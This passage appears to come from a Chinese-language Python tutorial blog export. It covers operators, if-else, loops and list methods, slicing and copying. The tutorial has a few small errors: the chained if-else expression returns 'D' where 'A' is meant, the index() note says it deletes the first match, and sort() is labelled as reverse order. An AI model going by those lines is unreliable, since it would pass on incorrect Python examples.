<tr>
<th align="center">Operator</th>
<th align="center">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>()</code></td>
<td align="center">Parentheses</td>
</tr>
<tr>
<td align="center"><code>**</code></td>
<td align="center">Exponent</td>
</tr>
<tr>
<td align="center"><code>+x</code>, <code>-x</code>, <code>~x</code></td>
<td align="center">Unary plus, Unary minus, Bitwise NOT</td>
</tr>
<tr>
<td align="center"><code>*</code>, <code>/</code>, <code>//</code>, <code>%</code></td>
<td align="center">Multiplication, Division, Floor division, Modulus</td>
</tr>
<tr>
<td align="center"><code>+</code>, <code>-</code></td>
<td align="center">Addition, Subtraction</td>
</tr>
<tr>
<td align="center"><code>&lt;&lt;</code>, <code>&gt;&gt;</code></td>
<td align="center">Bitwise shift operators</td>
</tr>
<tr>
<td align="center"><code>&amp;</code></td>
<td align="center">Bitwise AND</td>
</tr>
<tr>
<td align="center"><code>^</code></td>
<td align="center">Bitwise XOR</td>
</tr>
<tr>
<td align="center"><code>|</code></td>
<td align="center">Bitwise OR</td>
</tr>
<tr>
<td align="center"><code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&gt;=</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>is</code>, <code>is not</code>, <code>in</code>, <code>not in</code></td>
<td align="center">Comparisons, Identity, Membership operators</td>
</tr>
<tr>
<td align="center"><code>not</code></td>
<td align="center">Logical NOT</td>
</tr>
<tr>
<td align="center"><code>and</code></td>
<td align="center">Logical AND</td>
</tr>
<tr>
<td align="center"><code>or</code></td>
<td align="center">Logical OR</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="條件語句"><a href="#條件語句" class="headerlink" title="條件語句"></a>條件語句</h2><ol>
<li><p>比較運算符：</p>
<table>
<thead>
<tr>
<th align="center">Symbol</th>
<th align="center">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&lt;</td>
<td align="center">smaller than</td>
</tr>
<tr>
<td align="center">&lt;&#x3D;</td>
<td align="center">smaller than or equal to</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center">greater than</td>
</tr>
<tr>
<td align="center">&gt;&#x3D;</td>
<td align="center">greater than or equal to</td>
</tr>
<tr>
<td align="center">&#x3D;&#x3D;</td>
<td align="center">equal to</td>
</tr>
<tr>
<td align="center">!&#x3D;</td>
<td align="center">not equal</td>
</tr>
<tr>
<td align="center">is</td>
<td align="center">Objects’ id are equal</td>
</tr>
<tr>
<td align="center">is not</td>
<td align="center">Objects’ id are not equal</td>
</tr>
</tbody></table>
</li>
<li><p><code>if-else</code>語句：</p>
<ul>
<li>使用縮進調整執行的語句  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> x &lt; <span class="number">8</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;smaller than 8&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> x == <span class="number">8</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;equal to 8&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;greater than 8&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>if-else</code>表達式：</p>
<ul>
<li>將<code>if-else</code>語句縮減成一行的表達式  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># if-else 語句</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span> &lt;= score &lt; <span class="number">60</span>:</span><br><span class="line">    level = <span class="string">&#x27;D&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> <span class="number">60</span> &lt;= score &lt; <span class="number">80</span>:</span><br><span class="line">    level = <span class="string">&#x27;C&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> <span class="number">80</span> &lt;= score &lt; <span class="number">90</span>:</span><br><span class="line">    level = <span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    level = <span class="string">&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if-else 表達式</span></span><br><span class="line">level = (<span class="string">&#x27;D&#x27;</span> <span class="keyword">if</span> <span class="number">0</span> &lt;= score &lt; <span class="number">60</span> <span class="keyword">else</span></span><br><span class="line">        <span class="string">&#x27;C&#x27;</span> <span class="keyword">if</span> <span class="number">60</span> &lt;= score &lt; <span class="number">80</span> <span class="keyword">else</span></span><br><span class="line">        <span class="string">&#x27;B&#x27;</span> <span class="keyword">if</span> <span class="number">80</span> &lt;= score &lt; <span class="number">90</span> <span class="keyword">else</span></span><br><span class="line">        <span class="string">&#x27;D&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="循環結構"><a href="#循環結構" class="headerlink" title="循環結構"></a>循環結構</h2><h3 id="while循環"><a href="#while循環" class="headerlink" title="while循環"></a>while循環</h3><ol>
<li><p><code>while</code>循環語句：</p>
<ul>
<li>語法：<code>while condition:</code>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count = <span class="number">10</span></span><br><span class="line"><span class="keyword">while</span> count &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    count -= <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><code>break</code>語句：跳出此次循環</li>
<li><code>continue</code>語句：跳到下次循環</li>
</ul>
</li>
<li><p><code>while-else</code>循環語句：</p>
<ul>
<li>當不滿足<code>while</code>條件時執行<code>else</code>語句  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count = <span class="number">10</span></span><br><span class="line"><span class="keyword">while</span> count &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    count -= <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;count is not greater than 0&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>由於<code>else</code>是位於<code>while</code>語句中，因此<code>break</code>跳出<code>while</code>循環並不會執行<code>else</code>語句</li>
</ul>
</li>
<li><p>循環嵌套 nested loop</p>
<ul>
<li><code>while</code>循環中嵌套第二組<code>while</code>循環  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">9</span>:</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt;= i:</span><br><span class="line">        <span class="built_in">print</span>(j, <span class="string">&#x27; * &#x27;</span>, i, <span class="string">&#x27; = &#x27;</span>, i*j, end=<span class="string">&#x27;\t&#x27;</span>)    <span class="comment"># end 表示末尾字符</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><code>break</code>和<code>continue</code>只能作用於一層循環體</li>
</ul>
</li>
</ol>
<h3 id="for循環"><a href="#for循環" class="headerlink" title="for循環"></a>for循環</h3><ol>
<li><p><code>for</code>循環語句：</p>
<ul>
<li>語法：<code>for variable in iterableObject</code></li>
<li>可迭代對象 Iterable Object： <code>String</code>, <code>Array</code>, <code>Object</code>, <code>range()</code></li>
</ul>
</li>
<li><p>遍歷字符串<code>String</code>：</p>
<ul>
<li><code>variable</code>表示字符串中每一個字符  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for實現</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(char, end = <span class="string">&#x27; &#x27;</span>)  <span class="comment"># H e l l o   W o r l d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while實現</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(<span class="built_in">str</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>[i])</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>遍歷次數：</p>
<ul>
<li>使用<code>range(start, stop, step)</code>函數返回一個可迭代的對象  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定結束 stop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i, end = <span class="string">&#x27; &#x27;</span>)     <span class="comment"># 0 1 2 3 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定開始於結束 start &amp; stop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i, end = <span class="string">&#x27; &#x27;</span>)     <span class="comment"># 5 6 7 8 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定跨度 step</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">10</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(i, end = <span class="string">&#x27; &#x27;</span>)     <span class="comment"># 5 7 9</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>實用效果：</p>
<ul>
<li>遍歷所有質數  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n):</span><br><span class="line">        <span class="comment"># 如果其中有可被整除則不是質數，跳出循環</span></span><br><span class="line">        <span class="keyword">if</span> n % x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(n, end = <span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python - List</title>
    <url>/myBlog/2022/08/30/2022/2022-8-30-Python-List/</url>
    <content><![CDATA[<h2 id="列表基本使用"><a href="#列表基本使用" class="headerlink" title="列表基本使用"></a>列表基本使用</h2><h3 id="列表基礎"><a href="#列表基礎" class="headerlink" title="列表基礎"></a>列表基礎</h3><ul>
<li>列表基本使用  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 聲明列表</span></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;Hello 1&#x27;</span>, <span class="string">&#x27;Hello 2&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍歷列表</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> x:</span><br><span class="line">    <span class="built_in">print</span>(item, end = <span class="string">&#x27; &#x27;</span>)     <span class="comment"># 1 2 3 Hello 1 Hello 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根據索引獲取列表元素</span></span><br><span class="line"><span class="built_in">print</span>(x[<span class="number">2</span>])     <span class="comment"># 3</span></span><br><span class="line"><span class="built_in">print</span>(x[<span class="number">3</span>])     <span class="comment"># Hello 1</span></span><br><span class="line"><span class="built_in">print</span>(x[-<span class="number">1</span>])    <span class="comment"># Hello 2</span></span><br><span class="line"><span class="built_in">print</span>(x[-<span class="number">4</span>])    <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取列表長度</span></span><br><span class="line"><span class="built_in">len</span>(x)      <span class="comment"># 5</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="列表切片"><a href="#列表切片" class="headerlink" title="列表切片"></a>列表切片</h3><ul>
<li>使用<code>:</code>講列表切割：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;Hello 1&#x27;</span>, <span class="string">&#x27;Hello 2&#x27;</span>, <span class="string">&#x27;Hello 3&#x27;</span>]</span><br><span class="line"></span><br><span class="line">x[<span class="number">0</span>:<span class="number">3</span>]      <span class="comment"># [1, 2, 3]</span></span><br><span class="line">x[<span class="number">3</span>:<span class="number">6</span>]      <span class="comment"># [&#x27;Hello 1&#x27;, &#x27;Hello 2&#x27;, &#x27;Hello 3&#x27;]</span></span><br><span class="line">x[:<span class="number">3</span>]       <span class="comment"># [1, 2, 3]</span></span><br><span class="line">x[<span class="number">3</span>:]       <span class="comment"># [&#x27;Hello 1&#x27;, &#x27;Hello 2&#x27;, &#x27;Hello 3&#x27;]</span></span><br><span class="line">x[:]        <span class="comment"># [1, 2, 3, &#x27;Hello 1&#x27;, &#x27;Hello 2&#x27;, &#x27;Hello 3&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置列表路徑的跨度</span></span><br><span class="line">x[<span class="number">2</span>:<span class="number">6</span>:<span class="number">2</span>]    <span class="comment"># [3, &#x27;Hello 2&#x27;]</span></span><br><span class="line">x[::<span class="number">2</span>]      <span class="comment"># [1, 3, &#x27;Hello 2&#x27;]</span></span><br><span class="line">x[::-<span class="number">2</span>]     <span class="comment"># [&#x27;Hello 3&#x27;, &#x27;Hello 1&#x27;, 2]</span></span><br><span class="line">x[::-<span class="number">1</span>]     <span class="comment"># 列表倒序輸出</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="列表的方法"><a href="#列表的方法" class="headerlink" title="列表的方法"></a>列表的方法</h2><h3 id="添加-Add"><a href="#添加-Add" class="headerlink" title="添加 Add"></a>添加 Add</h3><ol>
<li><p><code>append()</code>方法：在列表末尾添加元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">x.append(<span class="string">&#x27;Hello 1&#x27;</span>)     <span class="comment"># [1, 2, 3, 4, 5, &#x27;Hello 1&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>extend()</code>方法：添加一個可迭代對象</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">x.extend([<span class="string">&#x27;Hello 1&#x27;</span>, <span class="string">&#x27;Hello 2&#x27;</span>, <span class="string">&#x27;Hello 3&#x27;</span>])     <span class="comment"># [1, 2, 3, 4, 5, &#x27;Hello 1&#x27;, &#x27;Hello 2&#x27;, &#x27;Hello 3&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用列表切片的方式在末尾添加可迭代對象</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">x[<span class="built_in">len</span>(x):] = [<span class="string">&#x27;Hello 1&#x27;</span>, <span class="string">&#x27;Hello 2&#x27;</span>]     <span class="comment"># [1, 2, 3, 4, 5, &#x27;Hello 1&#x27;， &#x27;Hello 2&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>insert()</code>方法：在列表指定位置插入元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">x.insert(<span class="number">1</span>, <span class="string">&#x27;Hello 2&#x27;</span>)      <span class="comment"># [1, &#x27;Hello 2&#x27;, 3, 4]</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="刪除-Remove"><a href="#刪除-Remove" class="headerlink" title="刪除 Remove"></a>刪除 Remove</h3><ol>
<li><p><code>remove()</code>方法：刪除列表中的指定元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">x.remove(<span class="number">2</span>)         <span class="comment"># [1, 3, 4]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果列表中存在多個匹配的元素，則只會刪除第一個</li>
<li>如果指定的元素不存在則報錯</li>
</ul>
</li>
<li><p><code>pop()</code>方法：刪除列表中指定位置的元素，並返回刪除的元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> ,<span class="number">4</span> ,<span class="number">5</span>]</span><br><span class="line">x.pop(<span class="number">3</span>)        <span class="comment"># [1, 2, 3, 5]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>clear()</code>方法：清空列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">x.clear()       <span class="comment"># []</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="更改-Update"><a href="#更改-Update" class="headerlink" title="更改 Update"></a>更改 Update</h3><ol>
<li><p>直接通過索引值更改元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">x[<span class="number">2</span>] = <span class="string">&#x27;Hello 1&#x27;</span>    <span class="comment"># [1, 2, &#x27;Hello 1&#x27;, 4]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通過列表切片一次性更改多個元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">x[<span class="number">3</span>:] = [<span class="string">&#x27;Hello 1&#x27;</span>, <span class="string">&#x27;Hello 2&#x27;</span>]      <span class="comment"># [1, 2, 3, &#x27;Hello 1&#x27;, &#x27;Hello 2&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在不知道某個元素的索引值時替換為新元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">x[x.index(<span class="number">4</span>)] = <span class="string">&#x27;Hello 1&#x27;</span>           <span class="comment"># [1, 2, 3, &#x27;Hello 1&#x27;, 5]</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="查找-Search"><a href="#查找-Search" class="headerlink" title="查找 Search"></a>查找 Search</h3><ol>
<li><p><code>count()</code>方法：查找某個元素出現的次數</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">9</span>, <span class="number">8</span>, <span class="string">&#x27;Hello 1&#x27;</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="string">&#x27;Hello 1&#x27;</span>]</span><br><span class="line">x.count(<span class="number">3</span>)          <span class="comment"># 3</span></span><br><span class="line">x.count(<span class="string">&#x27;Hello 1&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">x.count(<span class="number">4</span>)          <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>index()</code>方法：查找某個元素的索引值</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">9</span>, <span class="number">8</span>, <span class="string">&#x27;Hello 1&#x27;</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="string">&#x27;Hello 1&#x27;</span>]</span><br><span class="line">x.index(<span class="number">5</span>)          <span class="comment"># 4</span></span><br><span class="line">x.index(<span class="string">&#x27;Hello 1&#x27;</span>)  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果列表中存在多個匹配的元素，則只會刪除第一個</li>
<li>如果指定的元素不存在則報錯</li>
</ul>
</li>
<li><p><code>index(x, start, end)</code>：可選參數，指定查找的開始與結束位置</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">9</span>, <span class="number">8</span>, <span class="string">&#x27;Hello 1&#x27;</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="string">&#x27;Hello 1&#x27;</span>]</span><br><span class="line">x.index(<span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>)        <span class="comment"># 5</span></span><br><span class="line">x.index(<span class="string">&#x27;Hello 1&#x27;</span>, <span class="number">3</span>)   <span class="comment"># 8</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><ol>
<li><p><code>sort()</code>方法：對列表進行排序（倒序）</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line">x.sort()        <span class="comment"># [1, 2, 3, 3, 4, 5, 6, 9]</span></span><br><span class="line">x.sort(reverse = <span class="literal">True</span>)      <span class="comment"># [9, 6, 5, 4, 3, 3, 2, 1]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>reverse()</code>方法：反轉列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line">x.reverse()     <span class="comment"># [5, 3, 9, 2, 6, 4, 1, 3]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>copy()</code>方法：複製列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line">y = x.copy()    <span class="comment"># y = [3, 1, 4, 6, 2, 9, 3, 5]</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="列表的加與乘"><a href="#列表的加與乘" class="headerlink" title="列表的加與乘"></a>列表的加與乘</h2><ol>
<li><p>加法：</p>
<ul>
<li>對兩個列表進行拼接  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">y = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">z = x + y   <span class="comment"># z = [1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>乘法：</p>
<ul>
<li>重複列表裡面所有元素若干次  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">z = x * <span class="number">2</span>   <span class="comment"># z = [1, 2, 3, 1, 2, 3]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h2><ol>
<li><p>創建嵌套列表：</p>
<ul>
<li>創建二維列表  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>訪問嵌套列表：</p>
<ul>
<li><p>遍歷二維列表：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> matrix:</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> i:</span><br><span class="line">        <span class="built_in">print</span>(item, end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">        <span class="comment"># 1 2 3 </span></span><br><span class="line">        <span class="comment"># 4 5 6 </span></span><br><span class="line">        <span class="comment"># 7 8 9 </span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用下標訪問：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">matrix[<span class="number">1</span>]       <span class="comment"># [4, 5, 6]</span></span><br><span class="line">matrix[<span class="number">1</span>][<span class="number">2</span>]    <span class="comment"># 6</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="列表拷貝"><a href="#列表拷貝" class="headerlink" title="列表拷貝"></a>列表拷貝</h2><h3 id="列表淺拷貝方法"><a href="#列表淺拷貝方法" class="headerlink" title="列表淺拷貝方法"></a>列表淺拷貝方法</h3><ol>
<li><p><code>=</code>方式：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">y = x</span><br><span class="line">x[<span class="number">2</span>] = <span class="number">0</span>    <span class="comment"># y = [1, 2, 0, 4]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>copy()</code>方法：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">y = x.copy()</span><br><span class="line">x [<span class="number">2</span>] = <span class="number">0</span>       <span class="comment"># y = [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">x = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">y = x.copy()</span><br><span class="line">x [<span class="number">1</span>][<span class="number">1</span>] = <span class="number">2</span>    <span class="comment"># y = [[1, 2, 3], [4, 2, 6], [7, 8, 9]]</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>copy()</code>方法在嵌套列表中也只是淺拷貝</li>
</ul>
</li>
</ol>
<h3 id="嵌套列表問題"><a href="#嵌套列表問題" class="headerlink" title="嵌套列表問題"></a>嵌套列表問題</h3><ul>
<li>快速創建二維列表  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = [<span class="number">0</span>] * <span class="number">3</span>             <span class="comment"># 0 0 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):      <span class="comment"># 0 0 0</span></span><br><span class="line">    A[i] = [<span class="number">0</span>] * <span class="number">3</span>      <span class="comment"># 0 0 0</span></span><br><span class="line"></span><br><span class="line">A[<span class="number">0</span>] <span class="keyword">is</span> A[<span class="number">1</span>]    <span class="comment"># False</span></span><br><span class="line">A[<span class="number">1</span>] <span class="keyword">is</span> A[<span class="number">2</span>]    <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line">A[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>     <span class="comment"># 0 0 0</span></span><br><span class="line">                <span class="comment"># 0 1 0</span></span><br><span class="line">                <span class="comment"># 0 0 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 嵌套列表拷貝問題 #</span></span><br><span class="line">B = [[<span class="number">0</span>] * <span class="number">3</span>] * <span class="number">3</span>   <span class="comment"># 0 0 0</span></span><br><span class="line">                    <span class="comment"># 0 1 0</span></span><br><span class="line">                    <span class="comment"># 0 0 0</span></span><br><span class="line">    </span><br><span class="line">B[<span class="number">0</span>] <span class="keyword">is</span> B[<span class="number">1</span>]    <span class="comment"># True</span></span><br><span class="line">B[<span class="number">1</span>] <span class="keyword">is</span> B[<span class="number">2</span>]    <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">B[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>     <span class="comment"># 0 1 0</span></span><br><span class="line">                <span class="comment"># 0 1 0</span></span><br><span class="line">                <span class="comment"># 0 1 0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>由於<code>[[...]] * 3</code>的複製只是複製嵌套在內列表的地址值</li>
</ul>
</li>
</ul>
<h3 id="copy模塊"><a href="#copy模塊" class="headerlink" title="copy模塊"></a>copy模塊</h3><ul>
<li><p><code>copy.copy()</code>方法：實現淺拷貝</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">x = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">y = copy.copy(x)</span><br><span class="line">x[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span>     <span class="comment"># y = [[1, 2, 3], [4, 0, 6], [7, 8, 9]]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>copy.deepcopy()</code>方法：實現深拷貝</p>
